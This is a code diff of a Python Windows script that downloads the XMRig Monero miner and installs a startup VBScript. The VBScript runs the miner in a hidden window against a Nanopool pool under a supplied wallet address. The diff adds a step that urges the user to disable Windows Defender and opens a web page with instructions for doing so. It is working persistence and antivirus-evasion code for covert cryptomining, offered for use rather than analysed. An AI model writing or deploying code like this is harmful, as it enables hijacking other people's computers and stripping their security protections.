@@ -8,6 +8,7 @@ import shutil
 import threading
 import time
 import json
+import webbrowser  # Importing webbrowser module to open the URL
 
 def is_admin():
     return ctypes.windll.shell32.IsUserAnAdmin() != 0
@@ -39,7 +40,7 @@ def create_startup_vbs(xmrig_path, startup_path, bitcoin_address):
             vbs_file.write(f'Set WshShell = CreateObject("WScript.Shell")\n'
                            f'WshShell.Run """{xmrig_path}"" -o xmr-us-east1.nanopool.org:14433 -u {bitcoin_address} --tls --coin monero", 0, False\n')
     except IOError as e:
-        print(f"Error creating startup file: {e}")
+        print(f"Error creating startup VBScript: {e}")
         return False
     return True
 
@@ -94,6 +95,11 @@ def is_windows_defender_on():
         print(f"Error checking Windows Defender status: {e}")
         return False
 
+# Open a webpage with instructions to disable Windows Defender
+def open_instructions_url():
+    instructions_url = "https://www.windowscentral.com/how-disable-windows-defender-antivirus-windows-10"
+    webbrowser.open(instructions_url)
+
 def main():
     if not is_admin():
         show_message_box("This software must be run as Administrator!", "Admin Privileges Required")
@@ -101,7 +107,11 @@ def main():
 
     # Check if Windows Defender is on
     if is_windows_defender_on():
-        show_message_box("Please disable Windows Defender Antivirus protection before running this program.", "Windows Defender Active")
+        # Show message with instructions to disable Windows Defender
+        show_message_box("Windows Defender Antivirus is currently enabled. Please disable it before running this script.\n\nClick OK to view instructions on how to disable it in your browser.", "Windows Defender Active")
+        
+        # After OK, open the instructions page
+        open_instructions_url()
         sys.exit(1)
 
     URL = "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-gcc-win64.zip"
